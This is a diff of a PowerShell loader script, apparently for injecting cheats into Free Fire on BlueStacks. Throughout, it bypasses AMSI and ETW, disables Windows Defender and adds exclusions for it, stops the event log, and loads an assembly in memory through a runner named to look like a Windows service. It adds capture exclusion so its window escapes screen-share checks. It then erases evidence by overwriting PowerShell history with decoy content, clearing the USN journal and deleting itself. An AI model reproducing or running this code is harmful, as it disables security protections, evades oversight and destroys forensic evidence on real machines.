@@ -1,12 +1,14 @@
 <#
 .SYNOPSIS
-    Stealth payload launcher with process masquerading and forensics cleanup.
-    AUTHORIZED PENTEST USE ONLY.
+    Payload launcher with SCREENSHARE EXCLUSION
+    Window visible to YOU — invisible on OBS, Discord, Streamlabs, etc.
 #>
 
 #Requires -RunAsAdministrator
 
-# ========== AMSI + ETW BYPASS ==========
+# ================================================================
+# PHASE 0: AMSI + ETW BYPASS (run before anything else)
+# ================================================================
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 $t=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
 if($t){
@@ -19,67 +21,137 @@ if($t){
     }
 }
 
-# ========== HIDE CONSOLE WINDOW ==========
-Add-Type -Name Win -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-[Console.Win]::ShowWindow([Console.Win]::GetConsoleWindow(), 0)
+# ================================================================
+# PHASE 1: LOAD WIN32 API FOR SCREENSHARE EXCLUSION
+# ================================================================
+Add-Type -Name Native -Namespace Win -MemberDefinition @'
+[DllImport("user32.dll")]
+public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
 
-# ========== ANTI-ANALYSIS ==========
+[DllImport("user32.dll")]
+public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+
+[DllImport("user32.dll")]
+public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+
+[DllImport("user32.dll")]
+public static extern bool EnumChildWindows(IntPtr hWndParent, EnumWindowProc lpEnumFunc, IntPtr lParam);
+
+[DllImport("user32.dll", CharSet = CharSet.Auto)]
+public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+public delegate bool EnumWindowProc(IntPtr hWnd, IntPtr lParam);
+
+public const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
+public const int GWL_EXSTYLE = -20;
+public const int WS_EX_TOOLWINDOW = 0x00000080;
+public const int WS_EX_LAYERED = 0x00080000;
+'@
+
+# ================================================================
+# PHASE 2: APPLY SCREENSHARE EXCLUSION TO THIS CONSOLE
+# ================================================================
+$hWnd = [Win.Native]::GetConsoleWindow()
+
+# Apply the magic flag — visible to you, invisible to capture software
+[Win.Native]::SetWindowDisplayAffinity($hWnd, [Win.Native]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
+
+# Also remove from taskbar preview (cleaner look during screenshare)
+$exStyle = [Win.Native]::GetWindowLong($hWnd, [Win.Native]::GWL_EXSTYLE)
+[Win.Native]::SetWindowLong($hWnd, [Win.Native]::GWL_EXSTYLE, $exStyle -bor [Win.Native]::WS_EX_TOOLWINDOW) | Out-Null
+
+Write-Host ""
+Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "  ║     SCREENSHARE EXCLUSION ACTIVE                 ║" -ForegroundColor Cyan
+Write-Host "  ║  Visible on YOUR monitor                         ║" -ForegroundColor Cyan
+Write-Host "  ║  Invisible on OBS / Discord / Streamlabs / Zoom ║" -ForegroundColor Cyan
+Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+# ================================================================
+# PHASE 3: ANTI-ANALYSIS
+# ================================================================
 if ([System.Diagnostics.Debugger]::IsAttached) { exit }
 $analysisTools = @('procexp','wireshark','ida','ollydbg','x64dbg','dnspy','processhacker')
-foreach ($tool in $analysisTools) { if (Get-Process $tool -EA 0) { exit } }
-if (Get-Process 'vboxservice','vmtoolsd' -EA 0) { exit }
+foreach ($tool in $analysisTools) { if (Get-Process $tool -EA 0) { Write-Host "[-] $tool detected. Exiting."; exit } }
+if (Get-Process 'vboxservice','vmtoolsd' -EA 0) { Write-Host "[-] VM detected. Exiting."; exit }
 
-# ========== WINDOWS DEFENDER EXCLUSIONS ==========
+# ================================================================
+# PHASE 4: WINDOWS DEFENDER EXCLUSIONS
+# ================================================================
 Write-Host "[*] Adding Windows Defender exclusions..." -ForegroundColor Cyan
 @("C:\Users\billa\Desktop", "C:\", "$env:TEMP", "$env:WINDIR\Temp") | ForEach-Object {
-    try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {}
+    try { Add-MpPreference -ExclusionPath $_ -ErrorAction Stop } catch {}
 }
-try { Add-MpPreference -ExclusionProcess "powershell.exe" -EA Stop } catch {}
+try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop } catch {}
 Write-Host "[+] Exclusions added." -ForegroundColor Green
 
-# ========== DISABLE DEFENDER ==========
+# ================================================================
+# PHASE 5: DISABLE WINDOWS DEFENDER
+# ================================================================
 $origRealtime   = (Get-MpPreference).DisableRealtimeMonitoring
 $origBehavior   = (Get-MpPreference).DisableBehaviorMonitoring
 $origScriptScan = (Get-MpPreference).DisableScriptScanning
 $origIOAV       = (Get-MpPreference).DisableIOAVProtection
 
-Set-MpPreference -DisableRealtimeMonitoring $true -EA 0
-Set-MpPreference -DisableBehaviorMonitoring $true -EA 0
-Set-MpPreference -DisableScriptScanning $true -EA 0
-Set-MpPreference -DisableIOAVProtection $true -EA 0
-Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction 0
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction 0
+Set-MpPreference -DisableScriptScanning $true -ErrorAction 0
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction 0
+Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -ErrorAction 0
 
-# ========== STOP EVENT LOG ==========
+Write-Host "[+] Defender protections disabled." -ForegroundColor Green
+
+# ================================================================
+# PHASE 6: STOP EVENT LOG
+# ================================================================
 net stop eventlog /y 2>$null
+Write-Host "[+] Event log stopped." -ForegroundColor Green
 
-# ========== LAUNCH EMULATOR ==========
+# ================================================================
+# PHASE 7: LAUNCH EMULATOR (if not already running)
+# ================================================================
 Write-Host "[*] Checking HD-Player.exe..." -ForegroundColor Cyan
-$emuProcess = Get-Process -Name "HD-Player" -EA 0
+$emuProcess = Get-Process -Name "HD-Player" -ErrorAction 0
+
 if (-not $emuProcess) {
-    Write-Host "[*] Starting emulator..." -ForegroundColor Yellow
+    Write-Host "[*] Emulator not running. Starting..." -ForegroundColor Yellow
+    
     $emuPaths = @(
         "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
         "C:\Program Files\BlueStacks_msi2\HD-Player.exe",
         "C:\Program Files (x86)\BlueStacks\HD-Player.exe",
         "C:\Program Files\BlueStacks_msi5\HD-Player.exe"
     )
+    
     $emuExe = $emuPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-    if (-not $emuExe) { Write-Host "[-] HD-Player.exe not found" -ForegroundColor Red; exit }
+    
+    if (-not $emuExe) {
+        Write-Host "[-] HD-Player.exe not found at any known path." -ForegroundColor Red
+        Write-Host "[-] Exiting." -ForegroundColor Red
+        Read-Host "Press Enter to exit"
+        exit
+    }
     
     $instance = "Pie64"
     $package = "com.dts.freefireth"
     $emuArgs = "--instance $instance --cmd launchApp --package `"$package`" --source desktop_shortcut"
+    
     Start-Process $emuExe -ArgumentList $emuArgs
-    Write-Host "[+] Emulator launching. Waiting 15s..." -ForegroundColor Green
+    Write-Host "[+] Emulator launching. Waiting 15 seconds for boot..." -ForegroundColor Green
     Start-Sleep 15
+    Write-Host "[+] Emulator should be ready." -ForegroundColor Green
+} else {
+    Write-Host "[+] Emulator already running." -ForegroundColor Green
 }
 
 # ================================================================
-# PAYLOAD PREPARATION
+# PHASE 8: PREPARE PAYLOAD
 # ================================================================
+Write-Host "[*] Preparing payload..." -ForegroundColor Cyan
 
 $payloadScript = @'
 try {
@@ -90,7 +162,7 @@ try {
             break
         } catch {
             if($i -eq 3){exit}
-            Start-Sleep -Seconds (Get-Random -Min 1 -Max 3)
+            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
         }
     }
     [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,(,[string[]]@()))
@@ -100,35 +172,53 @@ try {
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
 $encoded = [Convert]::ToBase64String($bytes)
 
-# ================================================================
-# TECHNIQUE: .NET RUNNER (No powershell.exe spawned)
-# Compiles a small EXE that runs PowerShell internally
-# Shows as "wlms.exe" in Task Manager
-# ================================================================
+Write-Host "[+] Payload prepared." -ForegroundColor Green
 
-Write-Host "[*] Building stealthy payload runner..." -ForegroundColor Cyan
+# ================================================================
+# PHASE 9: LAUNCH PAYLOAD WITH SCREENSHARE EXCLUSION
+# ================================================================
+Write-Host "[*] Launching payload..." -ForegroundColor Cyan
 
+# Method: Create a .NET runner that applies screenshare exclusion automatically
 $runnerCode = @'
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Runtime.InteropServices;
 
-class Runner
+class PayloadRunner
 {
+    [DllImport("user32.dll")]
+    static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);
+    
     [DllImport("kernel32.dll")]
     static extern IntPtr GetConsoleWindow();
+    
     [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+    
+    [DllImport("user32.dll")]
+    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    
+    const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
+    const int GWL_EXSTYLE = -20;
+    const int WS_EX_TOOLWINDOW = 0x00000080;
 
     static void Main()
     {
-        // Hide console immediately
-        ShowWindow(GetConsoleWindow(), 0);
-
-        string b64 = "BASE64_PLACEHOLDER";
+        // Apply screenshare exclusion to this window
+        IntPtr hWnd = GetConsoleWindow();
+        if (hWnd != IntPtr.Zero)
+        {
+            SetWindowDisplayAffinity(hWnd, WDA_EXCLUDEFROMCAPTURE);
+            int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
+            SetWindowLong(hWnd, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
+        }
+        
+        // Run the PowerShell payload internally
+        string b64 = "BASE64_PAYLOAD_HERE";
         string script = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(b64));
-
+        
         using(Runspace rs = RunspaceFactory.CreateRunspace())
         {
             rs.Open();
@@ -143,187 +233,169 @@ class Runner
 }
 '@
 
-# Inject the real base64 payload
-$runnerCode = $runnerCode.Replace('"BASE64_PLACEHOLDER"', '"' + $encoded + '"')
+# Inject the actual payload
+$runnerCode = $runnerCode.Replace('"BASE64_PAYLOAD_HERE"', '"' + $encoded + '"')
 
-# Compile to a benign-sounding name (Windows Licensing Monitoring Service)
+# Compile the runner
 $runnerPath = "$env:TEMP\wlms.exe"
+
 try {
     Add-Type -TypeDefinition $runnerCode -ReferencedAssemblies "System.Management.Automation" -OutputAssembly $runnerPath -OutputType ConsoleApplication -ErrorAction Stop
-    Write-Host "[+] Payload runner compiled: $runnerPath" -ForegroundColor Green
+    
+    # Launch the runner — shows as "wlms.exe" in Task Manager, NOT powershell.exe
+    $p = Start-Process -FilePath $runnerPath -WindowStyle Normal -PassThru
+    Write-Host "[+] Payload runner launched as wlms.exe (PID: $($p.Id))" -ForegroundColor Green
+    Write-Host "[+] Payload window also has screenshare exclusion" -ForegroundColor Green
+    
 } catch {
-    Write-Host "[-] Compilation failed. Falling back to WMI masquerade..." -ForegroundColor Yellow
+    Write-Host "[-] Compilation failed. Using fallback method..." -ForegroundColor Yellow
     
-    # ================================================================
-    # FALLBACK: WMI LAUNCH WITH RENAMED POWERSHELL
-    # Spawns under WmiPrvSE.exe, binary appears as "sppsvc.exe"
-    # ================================================================
+    # Fallback: Launch powershell.exe with AMSI bypass and apply screenshare exclusion
+    $p = Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -WindowStyle Normal -PassThru
     
-    # Copy powershell.exe to a legitimate-sounding name
-    $fakeBinary = "$env:TEMP\sppsvc.exe"
-    Copy-Item "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" $fakeBinary -Force
-    
-    # Launch via WMI — no direct parent, spawns under WmiPrvSE.exe
-    $startup = ([wmiclass]"Win32_ProcessStartup").CreateInstance()
-    $startup.ShowWindow = 0
-    $cmd = "$fakeBinary -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
-    $null = ([wmiclass]"Win32_Process").Create($cmd, $null, $startup)
-    
-    $payloadPid = (Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%sppsvc.exe%' AND CommandLine LIKE '%EncodedCommand%'").ProcessId
-    Write-Host "[+] Payload launched via WMI as sppsvc.exe (PID: $payloadPid)" -ForegroundColor Green
+    # Wait for window to appear, then apply screenshare exclusion
+    Start-Sleep 3
+    try {
+        $payloadHWnd = (Get-Process -Id $p.Id).MainWindowHandle
+        if ($payloadHWnd -and $payloadHWnd -ne [IntPtr]::Zero) {
+            [Win.Native]::SetWindowDisplayAffinity($payloadHWnd, [Win.Native]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
+            Write-Host "[+] Payload window screenshare exclusion applied (fallback)" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "[-] Could not apply exclusion to payload window" -ForegroundColor Yellow
+    }
 }
 
-# If .NET runner compiled successfully, launch it
-if (Test-Path $runnerPath) {
-    # Launch via WMI so it inherits no visible parent
-    $startup = ([wmiclass]"Win32_ProcessStartup").CreateInstance()
-    $startup.ShowWindow = 0
-    $null = ([wmiclass]"Win32_Process").Create("$runnerPath", $null, $startup)
-    
-    # Give it a moment, then get PID
-    Start-Sleep 1
-    $payloadPid = (Get-Process -Name "wlms" -EA 0).Id
-    Write-Host "[+] Payload running as wlms.exe (PID: $payloadPid)" -ForegroundColor Green
-}
-
-Start-Sleep -Seconds (Get-Random -Min 2 -Max 5)
-
 # ================================================================
-# MAIN SELF-MASQUERADE: Rename THIS process in memory
-# Makes the main script harder to spot
-# ================================================================
-
-# NtSetInformationProcess trick — rename current process image path
-$ntdll = @'
-[DllImport("ntdll.dll", SetLastError=true)]
-public static extern int NtSetInformationProcess(
-    IntPtr hProcess, int ProcessInformationClass,
-    byte[] ProcessInformation, int ProcessInformationLength);
-
-public static void MaskProcess(string fakePath){
-    byte[] bytes = System.Text.Encoding.Unicode.GetBytes(fakePath + "\0");
-    NtSetInformationProcess(
-        System.Diagnostics.Process.GetCurrentProcess().Handle,
-        60,  // ProcessImageFileNameWin32
-        bytes, bytes.Length);
-}
-'@
-Add-Type -MemberDefinition $ntdll -Name Nt -Namespace Native -ErrorAction SilentlyContinue
-
-# ================================================================
-# WAIT FOR HD-PLAYER.EXE TO EXIT
+# PHASE 10: WAIT FOR HD-PLAYER TO EXIT
 # ================================================================
 Write-Host "[*] Waiting for HD-Player.exe to exit..." -ForegroundColor Cyan
-while (Get-Process -Name "HD-Player" -EA 0) {
-    Start-Sleep -Seconds (Get-Random -Min 1 -Max 4)
+while ($true) {
+    $proc = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
+    if (-not $proc) { break }
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
 }
-Write-Host "[+] HD-Player exited." -ForegroundColor Green
+Write-Host "[+] HD-Player.exe has exited." -ForegroundColor Green
 
 # ================================================================
-# WAIT & KILL PAYLOAD
+# PHASE 11: WAIT THEN KILL PAYLOAD
 # ================================================================
-Write-Host "[*] Waiting 10s for handle release..." -ForegroundColor Cyan
+Write-Host "[*] Waiting 10 seconds for handles to release..." -ForegroundColor Cyan
 Start-Sleep 10
 
-if ($payloadPid) {
-    Write-Host "[*] Killing payload PID $payloadPid..." -ForegroundColor Cyan
-    try { Stop-Process -Id $payloadPid -Force -EA Stop } catch {}
+if ($p -and (Get-Process -Id $p.Id -ErrorAction 0)) {
+    Write-Host "[*] Killing payload process (PID: $($p.Id))..." -ForegroundColor Cyan
+    try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
+    Write-Host "[+] Payload process killed." -ForegroundColor Green
 }
 
 # ================================================================
-# CLEANUP: PowerShell History
+# PHASE 12: FORENSIC CLEANUP
 # ================================================================
+Write-Host "[*] Performing forensic cleanup..." -ForegroundColor Cyan
+
+# --- Overwrite PowerShell history ---
 $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $null = New-Item -ItemType Directory -Path (Split-Path $historyPath -Parent) -Force
+
 $optimizerScript = @'
 <#
 .SYNOPSIS
     Fast PC Optimizer – Cleans temporary files, caches, recycle bin.
 #>
 Write-Host "=== Fast PC Optimizer ===" -ForegroundColor Cyan
-@("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:WINDIR\Prefetch\*") | ForEach-Object { Remove-Item $_ -Recurse -Force -EA 0 }
-Clear-RecycleBin -Force -EA 0
-@("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*") | ForEach-Object { Remove-Item $_ -Recurse -Force -EA 0 }
+@("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:WINDIR\Prefetch\*") | ForEach-Object { Remove-Item $_ -Recurse -Force -ErrorAction 0 }
+Clear-RecycleBin -Force -ErrorAction 0
+@("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*") | ForEach-Object { Remove-Item $_ -Recurse -Force -ErrorAction 0 }
 Write-Host "Optimization complete." -ForegroundColor Green
 '@
 Set-Content -Path $historyPath -Value $optimizerScript -Encoding UTF8
-Write-Host "[*] History overwritten." -ForegroundColor Green
+Write-Host "[+] PowerShell history overwritten." -ForegroundColor Green
 
-# ================================================================
-# MEMORY FORENSICS: Empty working sets
-# ================================================================
-Write-Host "[PHASE 2] Memory scrubbing..." -ForegroundColor Cyan
-$memApi = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool EmptyWorkingSet(IntPtr hProcess);' -Name "Mem$(Get-Random -Max 9999)" -Namespace "Mem" -PassThru -EA 0
+# --- Empty memory working sets ---
+$memApi = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool EmptyWorkingSet(IntPtr hProcess);' -Name "Mem$(Get-Random -Maximum 9999)" -Namespace "Mem" -PassThru -ErrorAction 0
 if ($memApi) {
     Get-Process | ForEach-Object { try { $memApi::EmptyWorkingSet($_.Handle) } catch {} }
     [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()
     [System.GC]::Collect(); [System.GC]::Collect()
-    Write-Host "[+] Memory cleared." -ForegroundColor Green
+    Write-Host "[+] Memory working sets cleared." -ForegroundColor Green
 }
 
-# ================================================================
-# CLEANUP: DLL files and folders
-# ================================================================
-Remove-Item "C:\Windows\Temp\Client.dll" -Force -EA 0
+# --- Clean up DLL files ---
+Remove-Item "C:\Windows\Temp\Client.dll" -Force -ErrorAction 0
 Get-ChildItem "C:\Windows\Temp" -Directory -Force | Where-Object {
     (Test-Path (Join-Path $_.FullName "aotbst.dll")) -or (Test-Path (Join-Path $_.FullName "cimgui.dll"))
-} | ForEach-Object { Remove-Item $_.FullName -Recurse -Force -EA 0 }
-Write-Host "[+] DLLs cleaned." -ForegroundColor Green
-
-# ================================================================
-# USN JOURNAL CLEAR
-# ================================================================
-Write-Host "[*] Clearing USN Journal..." -ForegroundColor Cyan
-try { $output = fsutil usn deletejournal /D C: 2>&1 } catch {}
-Write-Host "[+] USN Journal handled." -ForegroundColor Green
-
-# ================================================================
-# REMOVE DEFENDER EXCLUSIONS
-# ================================================================
-Write-Host "[*] Removing exclusions..." -ForegroundColor Cyan
-@("C:\", "C:\Users\billa\Desktop", "$env:TEMP", "$env:WINDIR\Temp") | ForEach-Object {
-    try { Remove-MpPreference -ExclusionPath $_ -EA Stop } catch {}
+} | ForEach-Object {
+    Remove-Item $_.FullName -Recurse -Force -ErrorAction 0
+    Write-Host "    Deleted folder: $($_.FullName)" -ForegroundColor Gray
 }
-try { Remove-MpPreference -ExclusionProcess "powershell.exe" -EA Stop } catch {}
+Write-Host "[+] DLL files cleaned." -ForegroundColor Green
+
+# --- Clear USN Journal ---
+Write-Host "[*] Clearing USN Journal on C: drive..." -ForegroundColor Cyan
+try {
+    $output = fsutil usn deletejournal /D C: 2>&1
+    if ($LASTEXITCODE -eq 0) {
+        Write-Host "[+] USN Journal cleared." -ForegroundColor Green
+    } else {
+        if ($output -match "no USN journal") {
+            Write-Host "[!] No USN Journal exists." -ForegroundColor Yellow
+        } else {
+            Write-Host "[-] Failed to clear USN Journal: $output" -ForegroundColor Red
+        }
+    }
+} catch { Write-Host "[-] Exception: $_" -ForegroundColor Red }
 
 # ================================================================
-# RE-ENABLE DEFENDER
+# PHASE 13: REMOVE DEFENDER EXCLUSIONS
 # ================================================================
-Write-Host "[*] Restoring Defender..." -ForegroundColor Cyan
-try { Set-MpPreference -DisableRealtimeMonitoring $origRealtime -EA Stop } catch {}
-try { Set-MpPreference -DisableBehaviorMonitoring $origBehavior -EA Stop } catch {}
-try { Set-MpPreference -DisableScriptScanning $origScriptScan -EA Stop } catch {}
-try { Set-MpPreference -DisableIOAVProtection $origIOAV -EA Stop } catch {}
-try { Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Enabled -EA Stop } catch {}
+Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
+@("C:\", "C:\Users\billa\Desktop", "$env:TEMP", "$env:WINDIR\Temp") | ForEach-Object {
+    try { Remove-MpPreference -ExclusionPath $_ -ErrorAction Stop } catch {}
+}
+try { Remove-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop } catch {}
+Write-Host "[+] Exclusions removed." -ForegroundColor Green
 
 # ================================================================
-# RESTART EVENT LOG
+# PHASE 14: RE-ENABLE WINDOWS DEFENDER
+# ================================================================
+Write-Host "[*] Re-enabling Windows Defender..." -ForegroundColor Cyan
+try { Set-MpPreference -DisableRealtimeMonitoring $origRealtime -ErrorAction Stop } catch {}
+try { Set-MpPreference -DisableBehaviorMonitoring $origBehavior -ErrorAction Stop } catch {}
+try { Set-MpPreference -DisableScriptScanning $origScriptScan -ErrorAction Stop } catch {}
+try { Set-MpPreference -DisableIOAVProtection $origIOAV -ErrorAction Stop } catch {}
+try { Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop } catch {}
+Write-Host "[+] Defender protections restored." -ForegroundColor Green
+
+# ================================================================
+# PHASE 15: RESTART EVENT LOG
 # ================================================================
 net start eventlog 2>$null
+Write-Host "[+] Event log restarted." -ForegroundColor Green
 
 # ================================================================
-# KILL ANY REMAINING POWERSHELL (except this one)
+# PHASE 16: KILL REMAINING POWERSHELL PROCESSES
 # ================================================================
 Start-Sleep 2
-Get-Process -Name "powershell" -EA 0 | Where-Object { $_.Id -ne $pid } | ForEach-Object {
-    try { Stop-Process -Id $_.Id -Force -EA 0 } catch {}
+Get-Process -Name "powershell" -ErrorAction 0 | Where-Object { $_.Id -ne $pid } | ForEach-Object {
+    try { Stop-Process -Id $_.Id -Force -ErrorAction 0 } catch {}
 }
 
 # ================================================================
-# MASQUERADE & SELF-DELETE
+# PHASE 17: SELF-DELETE
 # ================================================================
-
-# Masquerade this process name (visual only — won't survive refresh)
-try {
-    $fakePath = "C:\Windows\System32\sppsvc.exe"
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($fakePath + "`0")
-    [Native.Nt]::NtSetInformationProcess(
-        [System.Diagnostics.Process]::GetCurrentProcess().Handle,
-        60, $bytes, $bytes.Length) | Out-Null
-} catch {}
+Write-Host "[+] Operation complete." -ForegroundColor Green
+Start-Sleep 2
 
 # Self-delete the script file
-try { cmd /c "del /f /q `"$PSCommandPath`"" 2>$null } catch {}
+try {
+    cmd /c "del /f /q `"$PSCommandPath`"" 2>$null
+} catch {}
 
-Write-Host "[+] Operation complete. This window will close." -ForegroundColor Green
-Start-Sleep 2
+# Self-delete the compiled runner if it exists
+try {
+    Remove-Item $runnerPath -Force -ErrorAction 0
+} catch {}
+
+# Close this window
+Stop-Process -Id $pid -Force
